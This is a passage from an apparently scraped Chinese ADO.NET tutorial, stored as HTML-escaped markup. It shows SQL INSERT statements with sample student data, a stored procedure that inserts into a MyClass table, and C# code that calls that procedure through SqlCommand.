class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
 <span class="number">9</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">4</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">10</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">5</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">11</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">6</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">12</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">7</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">13</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">8</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">14</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">9</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">15</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">10</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">16</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">11</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">17</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">12</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">18</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">13</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">19</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">14</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">20</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">15</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">21</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">16</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
<span class="number">22</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">17</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
</code></pre><p> &#x63D2;&#x5165;&#x6570;&#x636E;&#x5230;&#x6570;&#x636E;&#x5E93;&#x8868;&#x4E2D;</p>
<p>&#x8BF4;&#x660E;&#x4E00;&#x4E0B;&#xFF0C;&#x7B49;&#x4F1A;&#x6211;&#x8981;&#x5411;MyClass&#x8868;&#x4E2D;&#x63D2;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x73B0;&#x5728;&#x4E3A;&#x8FD9;&#x4E2A;&#x8868;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x63D2;&#x5165;&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/7JJJry.gif" alt=""></p>
<pre><code> <span class="number">1</span> <span class="keyword">IF</span> OBJECT_ID(&amp;apos;Ins_ClasseD&amp;apos;,&amp;apos;P&amp;apos;) <span class="keyword">IS</span> <span class="keyword">NOT</span> NULL 
 <span class="number">2</span>   DROP <span class="function"><span class="keyword">PROCEDURE</span>  <span class="title">Ins_ClasseD</span>
 3   <span class="title">GO</span> 
 4   <span class="title">CREATE</span> <span class="title">PROCEDURE</span> <span class="title">Ins_ClasseD</span>
 5    @<span class="title">C_ID</span> <span class="title">int</span>  ,   
 6    @<span class="title">C_Name</span> <span class="title">nvarchar</span><span class="params">(200)</span>  ,
 7    @<span class="title">C_Descr</span> <span class="title">nvarchar</span><span class="params">(max)</span>
 8    <span class="title">AS</span>
 9    <span class="title">INSERT</span> <span class="title">INTO</span> <span class="title">dbo</span>.<span class="title">MyClass</span>
10            <span class="params">( C_ID, C_Name, C_Descr )</span>
11    <span class="title">VALUES</span>  <span class="params">( @C_ID, -- C_ID - int
12              @C_Name, -- C_Name - nvarchar(200)</span>
13              @<span class="title">C_Descr</span>  -- <span class="title">C_Descr</span> - <span class="title">nvarchar</span><span class="params">(max)</span>
14              );</span>
<span class="number">15</span>              
<span class="number">16</span>    GO
</code></pre><p> &#x7ED9;MyClass&#x8868;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;</p>
<p>&#x4E0B;&#x9762;&#x5F00;&#x59CB;&#x7A0B;&#x5E8F;&#x5B9E;&#x73B0;&#xFF1A;</p>
<p>&#x6211;&#x662F;&#x590D;&#x4E60;&#xFF0C;ADO.NET&#xFF0C;&#x73B0;&#x5728;&#x5C31;&#x968F;&#x4FBF;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x63A7;&#x5236;&#x53F0;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x6765;&#x5F00;&#x59CB;&#x6211;&#x7684;&#x6D4B;&#x8BD5;&#xFF1A;</p>
<p>&#x6CE8;&#x610F;;&#x5728;&#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x7B80;&#x5355;&#x6613;&#x4E8E;&#x7406;&#x89E3;&#xFF0C;&#x6211;&#x6CA1;&#x6709;&#x628A;&#x8FDE;&#x63A5;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x90A3;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF0C;&#x653E;&#x5230;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x3002;</p>
<p>&#x5982;&#x679C;&#x8981;&#x653E;&#x7684;&#x8BDD;&#xFF0C;&#x8981;&#x7528;&#x5230;System.Configuration&#x547D;&#x540D;&#x7A7A;&#x95F4;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;ConfigurationManager&#x7C7B;..&#x5177;&#x4F53;&#x7684;&#x7EC6;&#x8282;&#x5C31;&#x4E0D;&#x8BF4;&#x4E86;&#x3002;</p>
<p>&#x8BF7;&#x770B;&#x5177;&#x4F53;&#x5B9E;&#x73B0;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code>using <span class="class">System</span>;
using <span class="class">System</span>.<span class="class">Collections</span>.<span class="class">Generic</span>;
using <span class="class">System</span>.<span class="class">Linq</span>;
using <span class="class">System</span>.<span class="class">Text</span>;
using <span class="class">System</span>.<span class="class">Threading</span>.<span class="class">Tasks</span>;
using <span class="class">System</span>.<span class="class">Data</span>;
using <span class="class">System</span>.<span class="class">Data</span>.<span class="class">SqlClient</span>;
namespace <span class="class">ADO</span>.<span class="class">NET</span>&amp;<span class="symbol">#x63D2</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x6761</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x5230</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x4E2D</span>;
{
    class <span class="class">Program</span>
    {
        //&amp;<span class="symbol">#x8FDE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x7B26</span>;&amp;<span class="symbol">#x4E32</span>;
        private static string sqlCon = &amp;quot;server=.;database=<span class="class">DB_MyStudentLife</span>;uid=sa;pwd=<span class="class">Password_1</span>&amp;quot;;
        static void <span class="class">Main</span>(string[] args)
        {
            //<span class="number">1</span>&amp;<span class="symbol">#x521B</span>;&amp;<span class="symbol">#x5EFA</span>;&amp;<span class="symbol">#x8FDE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5BF9</span>;&amp;<span class="symbol">#x8C61</span>;&amp;<span class="symbol">#xFF08</span>;&amp;<span class="symbol">#x8FDE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x7B26</span>;&amp;<span class="symbol">#x4E32</span>;&amp;<span class="symbol">#xFF09</span>;
            <span class="class">SqlConnection</span> scon = new <span class="class">SqlConnection</span>(sqlCon);
            //<span class="number">2</span>&amp;<span class="symbol">#x521B</span>;&amp;<span class="symbol">#x5EFA</span>;&amp;<span class="symbol">#x547D</span>;&amp;<span class="symbol">#x4EE4</span>;&amp;<span class="symbol">#x5BF9</span>;&amp;<span class="symbol">#x8C61</span>;&amp;<span class="symbol">#xFF08</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x547D</span>;&amp;<span class="symbol">#x4EE4</span>;&amp;<span class="symbol">#x5BF9</span>;&amp;<span class="symbol">#x8C61</span>;&amp;<span class="symbol">#x8BBE</span>;&amp;<span class="symbol">#x7F6E</span>;&amp;<span class="symbol">#x5C5E</span>;&amp;<span class="symbol">#x6027</span>;&amp;<span class="symbol">#xFF09</span>;
            <span class="class">SqlCommand</span> scmd = new <span class="class">SqlCommand</span>();
            scmd.<span class="class">CommandText</span> = &amp;quot;<span class="class">Ins_ClasseD</span>&amp;quot;;
            scmd.<span class="class">CommandType</span> = <span class="class">CommandType</span>.<span class="class">StoredProcedure</span>;  //&amp;<span class="symbol">#x8FD9</span>;&amp;<span class="symbol">#x91CC</span>;&amp;<span class="symbol">#x6211</span>;&amp;<span class="symbol">#x4F7F</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x50A8</span>;&amp;<span class="symbol">#x8FC7</span>;&amp;<span class="symbol">#x7A0B</span>;&amp;<span class="symbol">#x6765</span>;&amp;<span class="symbol">#x63D2</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;
            scmd.<span class="class">Connection</span> = scon;
            //<span class="number">3</span>&amp;<span class="symbol">#x6253</span>;&amp;<span class="symbol">#x5F00</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x8FDE</span>;&amp;<span class="symbol">#x63A5</span>;
            scon.<span class="class">Open</span>();
            //&amp;<span class="symbol">#x8BBE</span>;&amp;<span class="symbol">#x7F6E</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x6570</span>;
            scmd.<span class="class">Parameters</span>.<span class="class">Add</span>(new <span class="class">SqlParameter</span>(&amp;quot;@<span class="class">C_ID</span>&amp;quot;,<span class="number">6</span>));
            scmd.<span class="class">Parameters</span>.<span class="class">Add</span>(new <span class="class">SqlParameter</span>(&amp;quot;@<span class="class">C_Name</span>&amp;quot;, &amp;quot;&amp;<span class="symbol">#x6D4B</span>;&amp;<span class="symbol">#x8BD5</span>;&amp;<span class="symbol">#x73ED</span>;&amp;quot;));
            scmd.<span class="class">Parameters</span>.<span class="class">Add</span>(new <span class="class">SqlParameter</span>(&amp;quot;@<span class="class">C_Descr</span>&amp;quot;, &amp;quot;&amp;<span class="symbol">#x8F6F</span>;&amp;<span class="symbol">#x4EF6</span>;&amp;<span class="symbol">#x6D4B</span>;&amp;<span class="symbol">#x8BD5</span>;&amp;<span class="symbol">#x6280</span>;&amp;<span class="symbol">#x672F</span>;&amp;quot;));
            //<span class="number">4</span>&amp;<span class="symbol">#x53D1</span>;&amp;<span class="symbol">#x9001</span>;&amp;<span class="symbol">#x547D</span>;&amp;<span class="symbol">#x4EE4</span>;
           int result= scmd.<span class="class">ExecuteNonQuery</span>();
